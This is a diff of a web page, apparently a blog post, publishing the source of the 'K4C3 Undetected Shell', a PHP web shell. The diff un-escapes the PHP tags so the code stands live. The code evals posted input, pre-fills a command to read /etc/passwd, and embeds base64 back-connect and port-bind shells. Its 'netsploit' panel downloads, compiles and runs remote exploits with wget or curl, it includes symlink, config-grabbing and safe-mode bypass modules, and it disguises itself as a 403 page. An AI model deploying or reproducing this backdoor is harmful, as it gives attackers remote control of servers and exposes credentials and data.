@@ -15,7 +15,7 @@ This shell was probably written by an Indonesion hacker who goes by the handle K
 
 ### K4C3 Undetected Shell Source Code (encrypted)
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 error_reporting(0);
 @set_time_limit(0);
 @session_start();
@@ -350,7 +350,7 @@ $port_bind_bd_pl = "ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruB
 $back_connect = "fZFRS8MwF IXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0StktGB8aihs prPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28jS2whVulCf lCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZja3ImclYa gh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92 +rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
 $back_connect_c = "XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29r WhyEzc+Z2TjpSserABYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl9?5 /3Wa43fpotyCABR95zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vK C1rI6wgSmN/niYb75i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVC nim7a/ZuJC0JTwf3ARkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlx iuPB3E0/gXejiHMcYjwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3X Ie1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
 $domain = "bVNRj6IwEH434T/MVZPCxaPuPSpw+3DZf3BPxjMVBmm2UNLWRW/jf79ScHV1gRKmM/PN12+GWbFY1JDCcykkhoShzVnDayziXDUliVbBJJiIMvw26wOjYPIeTAqBEBLIeUMtaOQFfJV2DiYoDfb5LgfzSgFJLN9JhFxyY1JaqJqLhnIp9k1Kc2wsagpZYovst3eZhLnv3v5jUF8tc6qlaF7BbxBXq1SORl6FniRwAzOHHb2P3FHjXoTkn2qQzL1ncLVuf1tzm1dbLmVIp30EkDD+HpEpnXuQ4W06MyhRyoOpwg9VjNUSm9BqUYdj3Ppps15soggy+DmUmR0ceSdxq4w4bvdo2+4gitArrroG9Sj7mxOCGzSMxHdYvpyHMsKig/KQa9orTjcwup9HWRwcmRNnMK2UHVv4kXmLPHhET44KTUdTelPS8ZAQXnVy0PFfl8AGHa8UQWl4CJOPYcMAXciQpBBvYOxJYkohV1LpJUxfXhbughVYPNofpuKF6pawaI9+PbmlsVgBze50iknCHJ4fiPMgyTB1wSSxOuvtfnjcu696nUGaJRws164zKd3uJG9eKVQay7Sytl0y1nVd/FCL9eX7c8TEzSHPwOEyDz8WulTY8xOnbtuF33YtJp8SLvfIkA8E6KWLrFI1sgcI1h52UuTbytaS3p/h5jfh2Wd2zOkBZJyb25k+3zy/sv8=";
-?&gt; 
+?> 
 &lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt; &lt;script type="text/javascript"&gt; function tukar(lama,baru){ document.getElementById(lama).style.display = 'none'; document.getElementById(baru).style.display = 'block'; } &lt;/script&gt; &lt;style type="text/css"&gt; 
 body{ background:#000000; } a { text-decoration:none; } a:hover{
 	border-bottom-width: 1px;
@@ -402,8 +402,8 @@ body{ background:#000000; } a { text-decoration:none; } a:hover{
 &lt;/head&gt; &lt;body onLoad="document.getElementById('cmd').focus();"&gt; &lt;div class="main"&gt; &lt;!-- head info start here --&gt; &lt;div class="head_info"&gt; &lt;table&gt;
   &lt;tr&gt; &lt;td rowspan="2"&gt;&lt;table class="b_tbl"&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="?"&gt;&lt;span class="b1"&gt;&lt;img src="http://i1303.photobucket.com/albums/ag156/kaceundetected/kaceundetected-1.jpg" width="319" height="100" border="0"&gt;&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;
   &lt;/tr&gt;&lt;tr&gt;
-    &lt;td&gt;&lt;span class="gaya"&gt;&lt;?php echo $xName; ?&gt;&lt;/span&gt;  | Stain that want to learn &lt;/td&gt;
-  &lt;/tr&gt;&lt;/table&gt;&lt;/td&gt; &lt;td&gt;&lt;?php echo $buff; ?&gt;&lt;br/&gt;&lt;/td&gt; 
+    &lt;td&gt;&lt;span class="gaya"&gt;<?php echo $xName; ?>&lt;/span&gt;  | Stain that want to learn &lt;/td&gt;
+  &lt;/tr&gt;&lt;/table&gt;&lt;/td&gt; &lt;td&gt;<?php echo $buff; ?>&lt;br/&gt;&lt;/td&gt; 
   &lt;/tr&gt;
   &lt;tr&gt;
     
@@ -411,32 +411,32 @@ body{ background:#000000; } a { text-decoration:none; } a:hover{
 &lt;/table&gt; 
 &lt;/div&gt; &lt;!-- head info end here --&gt;
 
- &lt;!-- menu start --&gt; &lt;div id="menu"&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;"&gt;explore&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=shell"&gt;shell&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=php"&gt;eval&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=mysql"&gt;mysql&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=phpinfo"&gt;phpinfo&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=netsploit"&gt;netsploit&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=upload"&gt;upload&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=jumping"&gt;jumping&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=symlink"&gt;symlink&lt;/a&gt;
+ &lt;!-- menu start --&gt; &lt;div id="menu"&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>"&gt;explore&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=shell"&gt;shell&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=php"&gt;eval&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=mysql"&gt;mysql&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=phpinfo"&gt;phpinfo&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=netsploit"&gt;netsploit&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=upload"&gt;upload&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=jumping"&gt;jumping&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&x=symlink"&gt;symlink&lt;/a&gt;
  
-  &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=domain"&gt;domain&lt;/a&gt;
-  &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=bypass"&gt;bypass&lt;/a&gt;
-  &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=logout"&gt;logout&lt;/a&gt; &lt;/div&gt; 
+  &lt;a href="?<?php echo "y=" . $pwd; ?>&x=domain"&gt;domain&lt;/a&gt;
+  &lt;a href="?<?php echo "y=" . $pwd; ?>&x=bypass"&gt;bypass&lt;/a&gt;
+  &lt;a href="?<?php echo "y=" . $pwd; ?>&x=logout"&gt;logout&lt;/a&gt; &lt;/div&gt; 
   
   
   &lt;!-- menu end --&gt;
   &lt;!-- menu2 start --&gt; 
   
-  &lt;div id="menu"&gt;&lt;a onClick="window.open('http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=&lt;?php echo $_SERVER['SERVER_ADDR']; ?&gt;','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=&lt;?php echo $_SERVER['SERVER_ADDR']; ?&gt;"&gt;Site list&lt;/a&gt;
-   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=python"&gt;python&lt;/a&gt;
-   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=cgi"&gt;Cgi Shell&lt;/a&gt;
-   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=cgi2012"&gt;CGI-Telnet 2012&lt;/a&gt;
-   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=phpini"&gt;Safe Mode&lt;/a&gt;
+  &lt;div id="menu"&gt;&lt;a onClick="window.open('http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php echo $_SERVER['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php echo $_SERVER['SERVER_ADDR']; ?>"&gt;Site list&lt;/a&gt;
+   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=python"&gt;python&lt;/a&gt;
+   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=cgi"&gt;Cgi Shell&lt;/a&gt;
+   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=cgi2012"&gt;CGI-Telnet 2012&lt;/a&gt;
+   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=phpini"&gt;Safe Mode&lt;/a&gt;
    
-   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=config"&gt;Config Sh3ll&lt;/a&gt;
-     &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=wp"&gt;Wordpress&lt;/a&gt;
-	 &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=joomla"&gt;Joomla&lt;/a&gt;
+   &lt;a href="?<?php echo "y=" . $pwd; ?>&x=config"&gt;Config Sh3ll&lt;/a&gt;
+     &lt;a href="?<?php echo "y=" . $pwd; ?>&x=wp"&gt;Wordpress&lt;/a&gt;
+	 &lt;a href="?<?php echo "y=" . $pwd; ?>&x=joomla"&gt;Joomla&lt;/a&gt;
    &lt;/div&gt; &lt;!-- menu2 end --&gt;
 
 
 
- &lt;?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&x=php" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td&gt; &lt;textarea class="output" name="cmd" id="cmd"&gt; &lt;?php if (isset($_POST['submitcmd'])) {
+ <?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?> &lt;form action="?y=<?php echo $pwd; ?>&x=php" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td&gt; &lt;textarea class="output" name="cmd" id="cmd"&gt; <?php if (isset($_POST['submitcmd'])) {
         echo eval(magicboom($_POST['cmd']));
-    } else echo "echo file_get_contents('/etc/passwd');"; ?&gt; &lt;/textarea&gt; &lt;tr&gt;&lt;td&gt;&lt;input style="width:6%;margin:0px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
+    } else echo "echo file_get_contents('/etc/passwd');"; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td&gt;&lt;input style="width:6%;margin:0px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/form&gt; <?php
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'mysql')) {
     if (isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) {
         $sqlhost = $_GET['sqlhost'];
@@ -556,7 +556,7 @@ SHOW STATUS;";
             @mysql_close($con);
         } else $msg = "&lt;p style=\"text-align:center;\"&gt;cant connect to mysql server&lt;/p&gt;";
         echo $msg;
-    } else { ?&gt; &lt;form action="?" method="get"&gt; &lt;input type="hidden" name="y" value="&lt;?php echo $pwd; ?&gt;" /&gt; &lt;input type="hidden" name="x" value="mysql" /&gt; &lt;table class="tabnet" style="width:300px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Connect to mySQL server&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Username&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Password&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Port&lt;/td&gt;&lt;td&gt;&lt;input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" /&gt;&nbsp;&lt;input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
+    } else { ?> &lt;form action="?" method="get"&gt; &lt;input type="hidden" name="y" value="<?php echo $pwd; ?>" /&gt; &lt;input type="hidden" name="x" value="mysql" /&gt; &lt;table class="tabnet" style="width:300px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Connect to mySQL server&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Username&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Password&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Port&lt;/td&gt;&lt;td&gt;&lt;input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" /&gt;&nbsp;&lt;input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
     }
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'phpinfo')) {
     @ob_start();
@@ -572,10 +572,10 @@ SHOW STATUS;";
     echo "&lt;meta http-equiv='refresh' content='0; url=?y=" . $pwd . "' /&gt;";
     "&lt;/div&gt;";
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'symlink')) {
-?&gt;
-&lt;form action="?y=&lt;?php echo $pwd; ?&gt;&amp;x=symlink" method="post"&gt;
+?>
+&lt;form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post"&gt;
 
-&lt;?php
+<?php
     @set_time_limit(0);
     echo "&lt;center&gt;";
     @mkdir('sym', 0777);
@@ -1005,7 +1005,7 @@ AddHandler cgi-script .izo";
             $content.= htmlentities(str_replace("''", "'", fgets($filez)));
         }
         @fclose($filez);
-    } ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&edit=&lt;?php echo $file; ?&gt;" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" name="content"&gt; &lt;?php echo $content; ?&gt; &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;Save as &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="&lt;?php echo $file; ?&gt;" /&gt;&lt;input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /&gt; &nbsp;&lt;?php echo $msg; ?&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
+    } ?> &lt;form action="?y=<?php echo $pwd; ?>&edit=<?php echo $file; ?>" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" name="content"&gt; <?php echo $content; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;Save as &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /&gt;&lt;input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /&gt; &nbsp;<?php echo $msg; ?>&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'upload')) {
     if (isset($_POST['uploadcomp'])) {
         if (is_uploaded_file($_FILES['file']['tmp_name'])) {
@@ -1027,9 +1027,9 @@ AddHandler cgi-script .izo";
         if (is_file($pindah)) {
             $msg = "file uploaded to $pindah";
         } else $msg = "failed to upload $namafile";
-    } ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&x=upload" enctype="multipart/form-data" method="post"&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from computer&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;p style="text-align:center;"&gt;&lt;input style="color:#000000;" type="file" name="file" /&gt;&lt;input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"&gt;&lt;/p&gt;&lt;/td&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="&lt;?php echo $pwd; ?&gt;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from url&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;form method="post" style="margin:0;padding:0;" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=upload"&gt; &lt;table&gt;&lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="&lt;?php echo $pwd; ?&gt;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;&lt;?php echo $msg; ?&gt;&lt;/div&gt; 
+    } ?> &lt;form action="?y=<?php echo $pwd; ?>&x=upload" enctype="multipart/form-data" method="post"&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from computer&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;p style="text-align:center;"&gt;&lt;input style="color:#000000;" type="file" name="file" /&gt;&lt;input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"&gt;&lt;/p&gt;&lt;/td&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from url&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"&gt; &lt;table&gt;&lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;<?php echo $msg; ?>&lt;/div&gt; 
   
-  &lt;?php
+  <?php
 } elseif (isset($_GET['x']) && ($_GET['x'] == 'netsploit')) {
     if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
         $port = trim($_POST['port']);
@@ -1082,11 +1082,11 @@ AddHandler cgi-script .izo";
         if (is_file($namafile)) {
             $msg = exe($wcmd);
         } else $msg = "error: file not found $namafile";
-    } ?&gt; &lt;table class="tabnet"&gt; &lt;tr&gt;&lt;th&gt;Port Binding&lt;/th&gt;&lt;th&gt;Connect Back&lt;/th&gt;&lt;th&gt;Load and Exploit&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="port" size="26" value="&lt;?php echo $bindport ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="bind_pass" size="26" value="&lt;?php echo $bindport_pass; ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select class="inputz" size="1" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;IP&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="ip" size="26" value="&lt;?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="backport" size="26" value="&lt;?php echo $bindport; ?&gt;"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select size="1" class="inputz" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=&lt;?php echo $pwd; ?&gt;&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;cmd&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;&lt;?php echo $msg; ?&gt;&lt;/div&gt; 
-    &lt;?php
-} elseif (isset($_GET['x']) && ($_GET['x'] == 'shell')) { ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&x=shell" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" readonly&gt; &lt;?php if (isset($_POST['submitcmd'])) {
+    } ?> &lt;table class="tabnet"&gt; &lt;tr&gt;&lt;th&gt;Port Binding&lt;/th&gt;&lt;th&gt;Connect Back&lt;/th&gt;&lt;th&gt;Load and Exploit&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select class="inputz" size="1" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;IP&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select size="1" class="inputz" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo 